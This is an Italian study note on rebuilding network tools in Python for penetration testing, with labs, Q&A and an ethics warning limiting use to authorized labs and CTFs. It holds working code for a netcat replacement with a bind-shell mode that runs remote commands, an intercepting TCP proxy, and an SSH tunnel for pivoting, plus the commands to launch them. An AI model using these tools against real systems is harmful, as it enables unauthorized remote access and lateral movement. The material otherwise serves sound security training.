---
tipo: concetto
tag: [tool]
fase: 1
fonti: 2
aggiornato: 2026-06-28
stato: maturo
aliases: ["Tool di Rete in Python"]
---

# Tool di Rete in Python

> [!warning] Nota etica
> Questi tool si usano **solo** su sistemi tuoi o in lab/CTF autorizzati ([[TryHackMe]],
> [[HackTheBox]], pwn.college). Usarli contro terzi senza autorizzazione scritta è reato. Vedi
> [[Penetration Testing]].

Python è un **moltiplicatore** quando sul target manca l'arsenale ma c'è l'interprete: si
ricostruiscono al volo i tool di rete essenziali con la sola standard library (`socket`,
`subprocess`, `threading`, `argparse`). Chiude l'area [[09 Python|Python]] dopo [[pwntools Base]].
Sotto, tre mattoni reali e funzionanti in Python 3.

## 1. Netcat replacement (client/server TCP)

Un `nc` portatile: in modalità *command* esegue comandi e ne rimanda l'output, in modalità *shell*
apre una shell remota. Utile quando `nc` non è installato sul target.

```python
#!/usr/bin/env python3
# tinync.py — sostituto minimale di netcat (client/server TCP)
import argparse, socket, subprocess, threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return ""
    out = subprocess.run(cmd, shell=True, capture_output=True)
    return (out.stdout + out.stderr).decode(errors="replace")

def handle(client, shell):
    if shell:                                   # modalità shell: cmd remoto verso /bin/sh
        client.send(b"tinync> ")
    while True:
        data = client.recv(4096)
        if not data:
            break
        response = execute(data.decode())
        if shell:
            response += "tinync> "
        client.send(response.encode())
    client.close()

def server(host, port, shell):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port)); s.listen(5)
    print(f"[*] In ascolto su {host}:{port}")
    while True:
        client, addr = s.accept()
        print(f"[+] Connessione da {addr[0]}:{addr[1]}")
        threading.Thread(target=handle, args=(client, shell)).start()

def client(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    try:
        while True:
            print(s.recv(4096).decode(errors="replace"), end="")
            s.send((input() + "\n").encode())
    except KeyboardInterrupt:
        s.close()

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("host"); p.add_argument("port", type=int)
    p.add_argument("-l", "--listen", action="store_true", help="modalità server")
    p.add_argument("-s", "--shell", action="store_true", help="abilita esecuzione comandi")
    a = p.parse_args()
    if a.listen:
        server(a.host, a.port, a.shell)
    else:
        client(a.host, a.port)
```

```bash
# Sul "target": apri un server che esegue comandi
python3 tinync.py 0.0.0.0 4444 -l -s
# Sull'attaccante: connettiti e impartisci comandi
python3 tinync.py 10.10.10.10 4444
```

## 2. Proxy TCP intercettante

Ascolta in locale, inoltra al target e stampa il traffico nei due sensi (hex dump). Utile per capire
protocolli proprietari e per il [[Man-in-the-Middle (MITM)|MITM]] applicativo in lab.

```python
#!/usr/bin/env python3
# tcpproxy.py — proxy TCP con hex dump bidirezionale
import sys, socket, threading

def hexdump(data, length=16):
    for i in range(0, len(data), length):
        chunk = data[i:i+length]
        hexa  = " ".join(f"{b:02X}" for b in chunk)
        text  = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"{i:04X}  {hexa:<{length*3}}  {text}")

def pipe(src, dst, label):
    while True:
        data = src.recv(4096)
        if not data:
            break
        print(f"\n[{label}] {len(data)} byte")
        hexdump(data)
        dst.send(data)                  # qui si potrebbe MODIFICARE il buffer prima di inoltrarlo

def proxy(local_host, local_port, remote_host, remote_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((local_host, local_port)); server.listen(5)
    print(f"[*] Proxy {local_host}:{local_port} -> {remote_host}:{remote_port}")
    while True:
        client, addr = server.accept()
        print(f"[+] Connessione da {addr[0]}:{addr[1]}")
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((remote_host, remote_port))
        threading.Thread(target=pipe, args=(client, remote, "C->S")).start()
        threading.Thread(target=pipe, args=(remote, client, "S->C")).start()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("uso: tcpproxy.py <lhost> <lport> <rhost> <rport>"); sys.exit(1)
    proxy(sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]))
```

```bash
# Intercetta il traffico verso un server FTP e mostralo
python3 tcpproxy.py 127.0.0.1 21 ftp.target.lab 21
```

## 3. Port forwarding / tunnel SSH

Con `paramiko` si crea un *local port forward* (come `ssh -L`) per raggiungere un host interno
attraverso un pivot, quando i tool standard mancano. Vedi [[Port Forwarding]] e [[Lateral Movement]].

```python
#!/usr/bin/env python3
# sshfwd.py — local port forward via SSH (equivale a: ssh -L lport:rhost:rport user@pivot)
import paramiko
from sshtunnel import SSHTunnelForwarder   # pip install sshtunnel paramiko

with SSHTunnelForwarder(
        ("pivot.lab", 22),
        ssh_username="user", ssh_password="password",
        remote_bind_address=("10.0.0.50", 3306),   # MySQL interno non raggiungibile direttamente
        local_bind_address=("127.0.0.1", 3307)) as t:
    print(f"[*] Tunnel attivo: 127.0.0.1:{t.local_bind_port} -> 10.0.0.50:3306")
    input("Premi invio per chiudere...\n")          # ora 127.0.0.1:3307 raggiunge il MySQL interno
```

## Concetti chiave

| Mattone | Standard library | Idea |
|---------|------------------|------|
| `socket` | `socket.socket(AF_INET, SOCK_STREAM)` | TCP/UDP grezzo: `bind`/`listen`/`accept` (server), `connect` (client) |
| `subprocess` | `subprocess.run(..., capture_output=True)` | esegue comandi e ne raccoglie stdout/stderr |
| `threading` | `threading.Thread(...)` | gestisce più connessioni / le due direzioni del proxy |
| `setsockopt` | `SO_REUSEADDR` | riusa la porta subito dopo la chiusura |

Differenza [[Reverse Shell e Bind Shell|bind vs reverse]]: nel **bind** è il target ad ascoltare
(`-l`), nella **reverse** è il target a connettersi all'attaccante (utile contro firewall in uscita
permissivi). Il netcat sopra è in modalità *bind*; per la reverse basta invertire chi fa `connect`/`listen`.

## Lab

- **[[HackTheBox]]** / **[[TryHackMe]]**: usa `tinync.py` per stabilizzare un foothold quando manca
  `nc`; il proxy/tunnel per il *pivoting* su box multi-host (THM *Wreath*, HTB Pro Lab *Dante*).
- **pwn.college** — moduli di networking e pivoting.
- Ricrea gli script seguendo i capitoli di rete di [[Fonte - Black Hat Python]].

## Domande
**D: Differenza tra bind shell e reverse shell a livello di socket?**
R: Nella bind shell il **target** apre una porta in ascolto e l'attaccante si connette; nella reverse
shell il **target** si connette all'attaccante in ascolto → aggira NAT e firewall che bloccano
l'inbound ma permettono l'outbound. Vedi [[Reverse Shell e Bind Shell]].

**D: Cosa fa un proxy TCP intercettante e a cosa serve?**
R: Si interpone tra client e server, inoltra il traffico e permette di ispezionarlo/modificarlo →
debug di protocolli e analisi di malware/C2 (stesso principio di [[Burp Suite]] per HTTP).

**D: Quando serve il port forwarding / tunnel?**
R: Per raggiungere servizi non esposti pivotando attraverso un host compromesso (es. accedere a un DB
interno via un web server). Vedi [[Pivoting]] e [[Port Forwarding]].

## Collegamenti

- [[Socket e Port Scanner]] · [[Requests e HTTP]] · [[Automazione Offensiva]] · [[pwntools Base]]
- [[Reverse Shell e Bind Shell]] · [[Port Forwarding]] · [[Man-in-the-Middle (MITM)]] · [[Lateral Movement]]

## Fonti

- [[Fonte - Black Hat Python]]
- Python docs — `socket`, `subprocess`, `threading`: https://docs.python.org/3/library/socket.html
